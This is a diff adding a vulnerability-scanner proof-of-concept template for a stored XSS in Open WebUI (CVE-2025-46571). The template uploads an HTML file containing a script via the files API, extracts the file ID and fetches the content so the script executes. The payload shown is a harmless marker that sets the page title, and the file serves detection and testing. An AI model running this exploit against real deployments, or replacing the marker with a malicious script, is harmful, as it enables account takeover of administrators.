@@ -1,0 +1,59 @@
+[info]
+id = "POC-AVE-2025-0004"
+name = "Open WebUI 存储型XSS PoC"
+author = "AVE"
+severity = "medium"
+tags = ["xss", "stored-xss", "cve-2025-46571", "open-webui", "cwe-79"]
+description = "Open WebUI /api/v1/files/ 接口未对HTML文件上传做安全限制，低权限用户可上传包含JavaScript的HTML文件。通过文件ID访问时HTML内容在浏览器中执行，导致存储型XSS。管理员访问攻击者构造的链接时将触发XSS，最终可导致账户接管和RCE。使用前请在headers.authorization中设置有效的Bearer令牌。"
+vuln_id = ["CVE-2025-46571", "GHSA-8gh5-qqh8-hq3x", "AVE-2025-0004"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/api/v1/files/"
+
+headers.Content-Type = "multipart/form-data; boundary=----WebKitFormBoundaryPOC"
+headers.authorization = "Bearer {{token}}"
+headers.User-Agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+body.type = "raw"
+body.content = "------WebKitFormBoundaryPOC\r\nContent-Disposition: form-data; name=\"file\"; filename=\"poc.html\"\r\nContent-Type: text/html\r\n\r\n<h1>POC</h1><script>document.title=\"POC_AVE_CHECK\"</script>\r\n------WebKitFormBoundaryPOC--"
+
+[[poc.requests.extractors]]
+type = "regex"
+part = "body"
+name = "file_id"
+value = "\"id\":\"([a-f0-9-]+)\""
+group = 1
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200, 201]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["\"id\""]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/api/v1/files/{{file_id}}/content/html"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/api/v1/files/{{file_id}}"
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["poc.html", "text/html"]
+expect = true
